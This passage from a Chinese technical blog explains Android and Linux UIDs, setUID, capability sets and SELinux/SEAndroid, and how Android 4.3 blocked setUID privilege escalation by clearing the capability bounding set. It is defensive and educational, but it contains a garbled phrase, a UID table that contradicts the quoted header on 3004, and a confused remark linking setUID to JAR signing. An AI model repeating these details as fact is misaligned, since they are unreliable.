They indicate special Android capabilities that the kernel is aware of. */</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> AID_NET_BT_ADMIN 3001 <span class=\"comment\">/* bluetooth: create any socket */</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> AID_NET_BT 3002       <span class=\"comment\">/* bluetooth: create sco, rfcomm or l2cap sockets */</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> AID_INET 3003         <span class=\"comment\">/* can create AF_INET and AF_INET6 sockets */</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> AID_NET_RAW 3004      <span class=\"comment\">/* can create raw INET sockets */</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> AID_APP 10000       <span class=\"comment\">/* <span class=\"doctag\">TODO:</span> switch users over to AID_APP_START */</span></span></span><br><span class=\"line\"><span class=\"comment\">/** android apk 的uid都是10000开始的 **/</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>📌 Android UID 分配机制概览<br>UID 范围    用途    示例<br>0 – 999    内核 / root / 守护进程    0=root, 100=logd<br>1000 – 1999    系统服务 / 框架进程    1000=system<br>2000 – 2999    硬件守护程序    2000=radio, 2001=bluetooth<br>3000 – 9999    其他核心服务（AID_*）    3004=audioserver, 1073=networkstack<br>10000 以上    普通 APK 应用    10123=com.x.app</p>\n<p>📦 普通应用为什么是 10000+？<br>    •    安装 APK 时，如果没有 <sharedUserId>：<br>    •    PackageManager 自动从 10000 开始为应用动态分配 UID。<br>    •    多用户模式下会按：</p>\n<p>app_uid = user_id * 100000 + app_id</p>\n<pre><code>•    如果有 &lt;sharedUserId&gt;，且不是 AID 预定义的 UID：\n•    必须满足条件：系统签名 + 安装在 system/priv-app。\n•    否则系统拒绝安装。\n</code></pre>\n<p>⸻</p>\n<h2 id=\"chmod-和-chown-命令介绍\"><a href=\"#chmod-和-chown-命令介绍\" class=\"headerlink\" title=\"chmod 和 chown 命令介绍\"></a>chmod 和 chown 命令介绍</h2><p>文件R/W/X的系统内部采用3Bit表示，R为最高位比特，置位为0x04,W为中间比特，置位为0x02,X为最低位比特，置位为0x01<br>shell中表示时，置位使用相应R/W/X表示，未置位使用-<br>操作文件面向群体的操作权限时，使用Chomd，可以直接使用数字，也可以使用助记符<br>(a:all ,u:owner user,g:group, +:add one permission, -:remove one permission)</p>\n<p>chown 命令用于改变文件的所有者和所属组(UID和GID)<br>SHELL命令中通常采用Name方式修改，而不是ID方式<br>一般格式： chown newUID : newGID FileName</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">chown system:system nohup.out</span><br></pre></td></tr></table></figure>\n<h2 id=\"UID-GID的衔接\"><a href=\"#UID-GID的衔接\" class=\"headerlink\" title=\"UID/GID的衔接\"></a>UID/GID的衔接</h2><p>Linux一切皆是文件<br>文件基于UID/GID来划分它的面向群体，对它的面向群体定义不同的操作权限<br>用户的行为映射为进程的运行<br>进程的运行使用进程的UID/GID来标识自己的身份<br>进程的UID/GID&lt;=======&gt;文件的UID/GID 完美衔接！！<br>进程的UID/GID除了被授予可操作文件的范畴外，非文件范畴的需要进行权限控制的操作（如重启系统等特权操作）继续通过进程的UID/GID身份来进行控制和授权<br>比如，对于Reboot这个API,其入口处可以check calling的Process的UID,如果不是Root，则Reject</p>\n<h1 id=\"进程的-Real-UID-和-Effective-UID\"><a href=\"#进程的-Real-UID-和-Effective-UID\" class=\"headerlink\" title=\"进程的 Real UID 和 Effective UID\"></a>进程的 Real UID 和 Effective UID</h1><h2 id=\"身份的标识：Real-UID\"><a href=\"#身份的标识：Real-UID\" class=\"headerlink\" title=\"身份的标识：Real UID\"></a>身份的标识：Real UID</h2><ul>\n<li>进程的UID只是泛称，其实有很多种不同的UID</li>\n<li>进程的Real UID是进程的身份的标识，用来说明 Who am I</li>\n<li>仅仅说明Who am I,但是没有“实权”是不行的</li>\n<li>Linux中，进程能做什么事情不是由Real UID决定的</li>\n<li>Real UID仅仅是身份，有身份没有权利是无用的<h2 id=\"权利的标识：Effective-UID\"><a href=\"#权利的标识：Effective-UID\" class=\"headerlink\" title=\"权利的标识：Effective UID\"></a>权利的标识：Effective UID</h2></li>\n<li>有身份无权利是不行的</li>\n<li>Effective UID是进程的权利的标识，标识了该进程的“权利”</li>\n<li>Linux中的进程的授权（即，当前进程具有的操作权限）是靠Effective UID来识别的</li>\n<li>有权利就能做一切，Linux中具有“特权”Effective UID的进程能为所欲为</li>\n<li>之前课时说明的，文件，资源以及特权API操作时对进程是否有权限的识别的UID,即是指Effective UID<h2 id=\"身份和权利的关系\"><a href=\"#身份和权利的关系\" class=\"headerlink\" title=\"身份和权利的关系\"></a>身份和权利的关系</h2></li>\n<li>一般情况下，身份和权利是一致的，即 Real UID = Effective UID</li>\n<li>所以，默认PS CMD 输出的UID指的是Effective UID,而没有输出Real UID<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ps aux</span><br><span class=\"line\">USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND</span><br><span class=\"line\">root           1  0.0  0.0 170644 14180 ?        Ss   Jun28   0:51 /sbin/init splash</span><br><span class=\"line\">root           2  0.0  0.0      0     0 ?        S    Jun28   0:00 [kthreadd]</span><br><span class=\"line\">root           3  0.0  0.0      0     0 ?        I&lt;   Jun28   0:00 [rcu_gp]</span><br><span class=\"line\">root           4  0.0  0.0      0     0 ?        I&lt;   Jun28   0:00 [rcu_par_gp]</span><br></pre></td></tr></table></figure></li>\n<li>我们也可以显式的显示完整的Effective UID 和 Real UID<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">查看所有进程的真实/有效 UID、GID</span></span><br><span class=\"line\">ps -eo pid,ruid,euid,rgid,egid,user,comm</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">仅看某个 PID（示例：1234）</span></span><br><span class=\"line\">ps -o pid,ruid,euid,rgid,egid,cmd -p 1234</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">从 /proc 读取（同时可见 Capability）</span></span><br><span class=\"line\">cat /proc/1234/status | egrep &#x27;Uid:|Gid:|Cap(Inh|Prm|Eff)&#x27;</span><br></pre></td></tr></table></figure>\n<h2 id=\"ROOT用户的特权\"><a href=\"#ROOT用户的特权\" class=\"headerlink\" title=\"ROOT用户的特权\"></a>ROOT用户的特权</h2></li>\n<li>我们所指的root用户，均是Effective UID = root的进程，尽管一般情况下，Real UID = Effective UID</li>\n<li>Effective UID = root的进程具有“皇权”，他不受任何限制，可以为所欲为</li>\n<li>它可以为自己正身：如果自己的身份（Real UID）不是root，它可以将自己的身份名正言顺的改为root(调用SetXUID),从而使身份和权利均是root</li>\n<li>它也可以自降为庶民：出家皈依，将自己的Real UID 和 Effective UID 都设置（降低，也是调用SetXUID）为庶民（非特权普通的Real UID,Effective UID），从而失去特权.<h2 id=\"UID的世袭\"><a href=\"#UID的世袭\" class=\"headerlink\" title=\"UID的世袭\"></a>UID的世袭</h2></li>\n<li>在linux世界里，为了安全考虑，UID的世袭遵循：身份世袭而权利不世袭的准则</li>\n<li>子进程的Real UID = Effective UID = 父进程的Real UID</li>\n<li>这使得临时夺权且尚位正身（普通Real UID 而特权Effective UID）的进程的子嗣不能继承其特权而仅能继承其的正身 （Real UID）</li>\n</ul>\n<h1 id=\"文件setUID标识\"><a href=\"#文件setUID标识\" class=\"headerlink\" title=\"文件setUID标识\"></a>文件setUID标识</h1><h2 id=\"平民身份、皇族特权的需求背景\"><a href=\"#平民身份、皇族特权的需求背景\" class=\"headerlink\" title=\"平民身份、皇族特权的需求背景\"></a>平民身份、皇族特权的需求背景</h2><ul>\n<li>Linux中的password是一个可执行程序（CMD），用于修改用户的密码</li>\n<li>Passwd需要操作多用户的账号文件（该文件高度安全，仅有ROOT用户可以读写）</li>\n<li>普通用户难道不能修改自己的密码？</li>\n<li>Passwd进程虽然是平民身份（普通用户启动它），却需要皇族的权利。身份和权利不一致。<h2 id=\"如何解决\"><a href=\"#如何解决\" class=\"headerlink\" title=\"如何解决\"></a>如何解决</h2>临时提升特权（Effective UID = root）而维持身份不变（Real UID = 普通用户），使得其利用特权行使职责时可避免世袭的安全问题。<h2 id=\"Linux的文件setUID标识\"><a href=\"#Linux的文件setUID标识\" class=\"headerlink\" title=\"Linux的文件setUID标识\"></a>Linux的文件setUID标识</h2></li>\n<li>文件的Owner UID设置为特殊用户，比如ROOT</li>\n<li>文件面向Owner UID的群体（第一组标志）的操作权限增加额外的setUID标识</li>\n<li>Linux系统保证，任何用户（进程）执行该可执行文件（会Fork一个新的进程来加载该可执行文件running）时，该可执行文件所在的子进程的Real UID仍然继承其父进程的Real UID，但是其Effective UID不再等于其父的Real UID而是被提升到该可执行文件的Owner UID<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ls -l | grep passwd</span><br><span class=\"line\">-rwsr-xr-x 1 root root         88464 Feb  6  2024 gpasswd</span><br><span class=\"line\">-rwxr-xr-x 1 root root        254160 Dec  2  2022 grub-mkpasswd-pbkdf2</span><br><span class=\"line\">-rwsr-xr-x 1 root root         68208 Feb  6  2024 passwd</span><br></pre></td></tr></table></figure>\n<h2 id=\"Chomd设置setUID的方式\"><a href=\"#Chomd设置setUID的方式\" class=\"headerlink\" title=\"Chomd设置setUID的方式\"></a>Chomd设置setUID的方式</h2></li>\n<li>和基本的RWX设置类似，有助记符和直接数字设置。直接数字设置时，采用4位数字，其中第一位标志setUID<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">chmod 4775 xxx.file //设置setUID</span><br><span class=\"line\">chmod 0775 xxx.file //取消setUID</span><br></pre></td></tr></table></figure>\n<h2 id=\"setUID的安全问题\"><a href=\"#setUID的安全问题\" class=\"headerlink\" title=\"setUID的安全问题\"></a>setUID的安全问题</h2></li>\n<li>sUID的进程的EUID提升了</li>\n<li>sUID的进程的RUID默认没有提升</li>\n<li>在sUID进程的RUID没有正身（也设置为ROOT）之前，其子民的RUID/EUID只是平民,此时是安全的</li>\n<li>要依据实际场景，有限制的决定是否要在sUID进程中为自己正身，需要明确知道其后果是，其任何子民的RUID/EUID均会提升至贵族（ROOT）</li>\n<li>两个例子，passwd（未正身），Android的su（正身）<h2 id=\"有RealGID-EffecitveGID-setGID吗\"><a href=\"#有RealGID-EffecitveGID-setGID吗\" class=\"headerlink\" title=\"有RealGID,EffecitveGID,setGID吗\"></a>有RealGID,EffecitveGID,setGID吗</h2></li>\n<li>存在，待看</li>\n</ul>\n<h2 id=\"文件-Capability（setcap-getcap）\"><a href=\"#文件-Capability（setcap-getcap）\" class=\"headerlink\" title=\"文件 Capability（setcap/getcap）\"></a>文件 Capability（setcap/getcap）</h2><ul>\n<li>除了 setUID 之外，现代 Linux/Android 更推荐使用 <strong>文件 Capability</strong> 赋权，避免一刀切的 root 特权。</li>\n<li>常用命令：<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">赋予二进制绑定低端口能力（示例）</span></span><br><span class=\"line\">sudo setcap &#x27;cap_net_bind_service=+ep&#x27; /path/to/bin</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">查看文件能力</span></span><br><span class=\"line\">getcap /path/to/bin</span><br></pre></td></tr></table></figure></li>\n<li>在 Android 上，系统分区的二进制能力通常由构建系统打包时附加；第三方 App 无法随意为自身可执行文件设置 capability。</li>\n</ul>\n<p>如此管理权限颗粒度太粗，不够精细，所以引入了Capability机制</p>\n<h1 id=\"Linux的Capability机制\"><a href=\"#Linux的Capability机制\" class=\"headerlink\" title=\"Linux的Capability机制\"></a>Linux的Capability机制</h1><h2 id=\"UID怎么了\"><a href=\"#UID怎么了\" class=\"headerlink\" title=\"UID怎么了\"></a>UID怎么了</h2><ul>\n<li>权限颗粒太粗</li>\n<li>容易引起权利过剩（溢出）</li>\n<li>权利溢出/过剩引起的安全问题<h2 id=\"Capability-细粒度的权限控制\"><a href=\"#Capability-细粒度的权限控制\" class=\"headerlink\" title=\"Capability:细粒度的权限控制\"></a>Capability:细粒度的权限控制</h2></li>\n<li>我们需要细粒度的权限</li>\n<li>除了皇帝，我们也需要不同的地方官</li>\n<li>Linux引入了Capability:每个Capability系统内以一位Bit代表，OS内部使用64bit存储<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//android_filesystem_capability.h</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> CAP_CHOWN 0</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> CAP_DAC_OVERRIDE 1</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> CAP_DAC_READ_SEARCH 2</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> CAP_FOWNER 3</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> CAP_FSETID 4</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> CAP_KILL 5</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> CAP_SETGID 6</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> CAP_SETUID 7</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> CAP_SETPCAP 8</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> CAP_LINUX_IMMUTABLE 9</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> CAP_NET_BIND_SERVICE 10</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> CAP_NET_BROADCAST 11</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> CAP_NET_ADMIN 12</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> CAP_NET_RAW 13</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> CAP_IPC_LOCK 14</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> CAP_IPC_OWNER 15</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> CAP_SYS_MODULE 16</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> CAP_SYS_RAWIO 17</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> CAP_SYS_CHROOT 18</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> CAP_SYS_PTRACE 19</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> CAP_SYS_PACCT 20</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"进程的Capability\"><a href=\"#进程的Capability\" class=\"headerlink\" title=\"进程的Capability\"></a>进程的Capability</h2></li>\n<li>Permitted Capability Sets<ul>\n<li>当前进程的权利的围栏，最大权利范围，是Effecitve Capability Sets的超集</li>\n</ul>\n</li>\n<li>Effective Capability Sets<ul>\n<li>当前进程的时机使用（支配）的权利集，该集内的Capability必须从属于Permitted Capability Sets。该集合与Effective UID类似，是实际的权利标识</li>\n</ul>\n</li>\n<li>Inheritable Capability Sets<ul>\n<li>子进程唯一可以直接继承的Capability Sets。在Capability模式下，只有子进程的Inheritable Capability Sets = 父进程的Inheritable Capabiltity Sets。其他皆是NO<h2 id=\"文件的Capability\"><a href=\"#文件的Capability\" class=\"headerlink\" title=\"文件的Capability\"></a>文件的Capability</h2></li>\n</ul>\n</li>\n<li>Permitted Capability Sets<ul>\n<li>该可执行文件可以为其进程带来的Permitted Capability Sets</li>\n</ul>\n</li>\n<li>Effective Capability Set<ul>\n<li>仅1bit,Enable or Disable ,标识该可执行文件running所在的进程的Permitted Capability Sets是否自动全部Assign到其Effective Capability Sets。通常用于与传统的Root-setUID可执行文件向下兼容。</li>\n</ul>\n</li>\n<li>Inheritable Capability Sets<ul>\n<li>与进程的Inheritable Capability Sets一起作用（位与）以决定新的进程的Permitted Capability Sets<h2 id=\"Capability-BoundSet\"><a href=\"#Capability-BoundSet\" class=\"headerlink\" title=\"Capability BoundSet\"></a>Capability BoundSet</h2></li>\n</ul>\n</li>\n<li>Capability BoundSet是进程的超集</li>\n<li>是进程自己为自己设定的安全围栏（Capability Sets），限制可执行文件的Permitted Capability Sets仅有局部能转化为进程的Permitted Capability Sets</li>\n<li>Capability BoundSet能够被子进程继承</li>\n<li>Init进程默认Capability BoundSet 为全1<h2 id=\"Spawn进程的Capability\"><a href=\"#Spawn进程的Capability\" class=\"headerlink\" title=\"Spawn进程的Capability\"></a>Spawn进程的Capability</h2>P’(permitted) = (P(inheritable) &amp; F(inheritable)) | (F(permitted) &amp; cap_bset)<br>P’(effective) = F(effective)?P’(permitted):0<br>P’(inheritable) = P(inheritable)<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cat /proc/[pid]/status | grep Cap</span><br></pre></td></tr></table></figure>\n<h1 id=\"Capability与UID的兼容\"><a href=\"#Capability与UID的兼容\" class=\"headerlink\" title=\"Capability与UID的兼容\"></a>Capability与UID的兼容</h1></li>\n<li>新技术必须向下（前）兼容，要保证旧的实体（应用）工作正常</li>\n<li>旧的应用：Capability - dumb进程<br>Permitted Capability Sets = Effective Capability Sets = Inheritable Capability Sets = 0x000000000000000,我不知道，我怎么设置？</li>\n<li>旧的可执行文件：Capability - dumb文件:<br>Root-setUID可执行文件，系统转变为Capability的方式为：File Effective Bit = True;File ‘s Permitted和Inheritable Capability Sets = 0xFFFFFFFFFFFFFFFF</li>\n<li>旧的 Root EUID 的进程：对使用 v1（JAR）签名时代的 setUID 兼容，<strong>File Effective Bit = true</strong> 时仍会将文件的 Permitted 能力集赋予进程（受 BoundSet 限制）。</li>\n<li>注意：公式中的常量应为 <strong>PR_CAPBSET</strong>（capability bound set），不是 PR_CAPBEST。<h1 id=\"高级特性\"><a href=\"#高级特性\" class=\"headerlink\" title=\"高级特性\"></a>高级特性</h1><h2 id=\"被ROOT了怎么办\"><a href=\"#被ROOT了怎么办\" class=\"headerlink\" title=\"被ROOT了怎么办\"></a>被ROOT了怎么办</h2></li>\n<li>手机被ROOT了怎么办</li>\n<li>恶意应用获取了ROOT权限怎么办？</li>\n<li>现在无能为力</li>\n<li>我们想怎么样？即便ROOT EUID的应用，仍然不能为所欲为<h2 id=\"SELinux\"><a href=\"#SELinux\" class=\"headerlink\" title=\"SELinux\"></a>SELinux</h2></li>\n<li>拯救英雄</li>\n<li>DAC和MAC的策略区别</li>\n<li>DAC(Discretionary Access Control)自主访问控制：传统U6 m0k9noijnix/Linux安全管理模型；主体对它所属的对象和运行的程序拥有全部的控制权</li>\n<li>MAC(Mandatory Access Control)强制访问控制：SELinux基于的安全策略；管理员管理访问控制。管理员指定策略，用户不能改变它。策略定义了哪个主体能访问哪个对象。采用最小特权方式，默认情况下应用程序和用户没有任何权限</li>\n<li>Web服务器的假想例子<br>DAC模式下，Web服务器进程具有ROOT权限，当恶意病毒攻击成功并注入Web服务器进程后，则可以利用Web服务器进程的ROOT权限，做任何事情。<br>MAC模式下：Web服务器进程所能操作的对象和权限均在安全策略中明确列出，比如，只允许访问网络和访问特定文件等。即便Web服务器被恶意病毒攻击注入了，你仍然无法借由Web服务器进程为所欲为，所有安全策略没有授权的行为仍然是不允许的。<h2 id=\"SEAndroid\"><a href=\"#SEAndroid\" class=\"headerlink\" title=\"SEAndroid\"></a>SEAndroid</h2></li>\n<li>与SELinux的关系<br>SEAndroid (Security-Enhanced Android) 将原本运用在Linux上的SELinux技术移植到了Android平台上</li>\n<li>与SELinux的区别<br>除了移植SELinux以外，还做了很多针对Android的安全提高，比如把Binder IPC、Socket、Properites访问控制加入到了SEAndroid的控制中。</li>\n<li>SEAndroid的核心理念<br>即使恶意应用篡得了ROOT权限，恶意应用仍然被优先的控制着仍然不能为所欲为。</li>\n</ul>\n<h2 id=\"Jelly-Bean-MR2（Android-4-3）的补丁（setUID-提权收紧）\"><a href=\"#Jelly-Bean-MR2（Android-4-3）的补丁（setUID-提权收紧）\" class=\"headerlink\" title=\"Jelly Bean MR2（Android 4.3）的补丁（setUID 提权收紧）\"></a>Jelly Bean MR2（Android 4.3）的补丁（setUID 提权收紧）</h2><ul>\n<li>在 Android 4.3 之前，APK 进程能通过 <code>Runtime.exec()</code> 执行 <strong>root-setUID</strong> 二进制并提升 EUID。</li>\n<li>4.3 起，Zygote 在 fork 应用进程时<strong>清空 Capability Bound Set</strong>，使后续执行 setUID 文件时即使 EUID 改变，也<strong>无实际 capability</strong>可用。</li>\n<li>关键逻辑位于 Zygote 分支（Dalvik/ART 不同版本位置不同），等价于：<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 伪代码：清空 PR_CAPBSET（capability bound set）</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"type\">int</span> i = <span class=\"number\">0</span>; prctl(PR_CAPBSET_READ, i, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>) &gt;= <span class=\"number\">0</span>; i++) &#123;</span><br><span class=\"line\">    prctl(PR_CAPBSET_DROP, i, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></li>\n<li>结论：普通 APK 进程执行 root-setUID 二进制不再具备有效的 capability，无法借此获取特权。</li>\n</ul>\n<h3 id=\"JB-MR2-细节（扩展版）\"><a href=\"#JB-MR2-细节（扩展版）\" class=\"headerlink\" title=\"JB MR2 细节（扩展版）\"></a>JB MR2 细节（扩展版）</h3><p><strong>动机</strong><br>早期（4.2 及之前）APK 进程可通过 <code>Runtime.exec()</code>/<code>fork+exec</code> 执行带 <strong>setUID-root</strong> 位的二进制，从而把子进程的 <strong>EUID 提升为 0</strong>，再借助传统 root 权限做特权操作。为阻断这一途径，Android 4.3 在 Zygote 派生应用进程后，对 <strong>Capability Bound Set（BSET）</strong> 进行清空，使随后即便执行 setUID 文件，进程也<strong>拿不到任何有效的 capability</strong>。</p>\n<p><strong>内核前提</strong>  </p>\n<ul>\n<li>依赖 Linux 的 <strong>Capability Bounding Set</strong> 机制（<code>prctl(PR_CAPBSET_DROP, cap)</code>）。  </li>\n<li>当某 capability 被从 BSET 中 drop 后，后续<strong>不可再添加</strong>到该进程的 Permitted 集（除非通过 exec 进入 <code>init</code>/更高权限环境，但普通 APK 不具备）。</li>\n</ul>\n<p><strong>Zygote 侧变化（伪代码）</strong>  </p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 在 fork 普通应用进程后（进入 app uid/gid 环境前后），遍历所有 capability：</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"type\">int</span> cap = <span class=\"number\">0</span>; prctl(PR_CAPBSET_READ, cap, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>) &gt;= <span class=\"number\">0</span>; ++cap) &#123;</span><br><span class=\"line\">    prctl(PR_CAPBSET_DROP, cap, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>);  <span class=\"comment\">// 将 BSET 清空</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// 随后再 setresgid / setresuid 至应用 uid/gid，清空附属组等。</span></span><br><span class=\"line\"><span class=\"comment\">// 注意：JB MR2 当时并**未**依赖 PR_SET_NO_NEW_PRIVS（较新内核才有），主要手段就是清空 BSET。</span></span><br></pre></td></tr></table></figure>\n\n<p><strong>能力传播公式回顾</strong><br>对一次 <code>execve(file)</code>，新的进程 capability 计算（简化）为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">P&#x27; = (P_inh &amp; F_inh) | (F_perm &amp; BSET)</span><br><span class=\"line\">E&#x27; = F_eff ? P&#x27; : 0</span><br><span class=\"line\">I&#x27; = P_inh   // 仅 Inheritable 可直接继承</span><br></pre></td></tr></table></figure>\n<ul>\n<li>其中 <code>F_*</code> 来自<strong>目标可执行文件</strong>的 capability，<code>P_*</code> 为<strong>当前进程</strong>；<code>BSET</code> 为 <strong>Capability Bound Set</strong>。</li>\n<li>当 <strong>BSET = 0</strong> 时，无论 <code>F_perm</code> 多大、<code>F_eff</code> 是否置位，<code>P&#39;</code> 都只能来源于 <code>P_inh &amp; F_inh</code>。而普通 APK 的 <code>P_inh</code> 默认为 0，故 <code>P&#39; = 0</code>，<code>E&#39; = 0</code>。</li>\n</ul>\n<p><strong>对 setUID-root 的具体影响</strong>  </p>\n<ul>\n<li>setUID 仍会令子进程的<strong>EUID 变为 0</strong>（身份层面），但由于 <code>P&#39;=0</code>、<code>E&#39;=0</code>，进程<strong>没有任何有效 capability</strong>，无法执行需要 capability 的特权操作（例如 <code>CAP_SYS_ADMIN</code>、<code>CAP_SYS_MODULE</code> 等）。</li>\n<li>这等价于：<strong>“看起来像 root，实则无权”</strong>，从根本上堵住了通过 setUID 提权的常见路径。</li>\n</ul>\n<p><strong>前/后对比（示例）</strong>  </p>\n<ul>\n<li><em>JB MR2 之前（BSET=全 1）</em>：<ul>\n<li><code>F_eff=1</code>、<code>F_perm</code> 含若干能力 → <code>P&#39;</code> 至少获得 <code>F_perm &amp; BSET</code>，再赋给 <code>E&#39;</code>，子进程具备相应特权。</li>\n</ul>\n</li>\n<li><em>JB MR2 之后（BSET=0）</em>：<ul>\n<li>即便 <code>F_eff=1</code>，也因 <code>F_perm &amp; 0 = 0</code> → <code>P&#39;=0</code>、<code>E&#39;=0</code>。</li>\n</ul>\n</li>\n</ul>\n<p><strong>如何验证</strong>  </p>\n<ol>\n<li>在 APK 内部 <code>exec</code> 一个 setUID-root 的小程序：<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id; cat /proc/$$/status | egrep &#x27;Uid:|Gid:|Cap(Inh|Prm|Eff)&#x27;</span><br></pre></td></tr></table></figure>\n可见 <code>Uid:</code> 的 <code>EUID</code> 为 0，但 <code>CapEff:</code> 为全 0。  </li>\n<li>改为在 <code>adb shell</code>（root 环境）直接运行同一程序（不经 Zygote app 沙盒）对比其 <code>CapEff</code>，能观察到差异。</li>\n</ol>\n<p><strong>补充说明</strong>  </p>\n<ul>\n<li>这一设计与后续版本中的 <strong>SELinux（Enforcing）</strong>、<strong>权限拆分/前台服务限制</strong> 等共同组成多层防护。  </li>\n<li>后续 Android/内核版本也引入了 <code>no_new_privs</code> 等手段，但 <strong>JB MR2 的关键变化点就是清空 BSET</strong>。</li>\n</ul>\n<p>捕鱼篇</p>\n<h1 id=\"签名和权限\"><a href=\"#签名和权限\" class=\"headerlink\" title=\"签名和权限\"></a>签名和权限</h1><h2 id=\"移动平台中的主流签名作用：自签名的完整性鉴别\"><a href=\"#移动平台中的主流签名作用：自签名的完整性鉴别\" class=\"headerlink\" 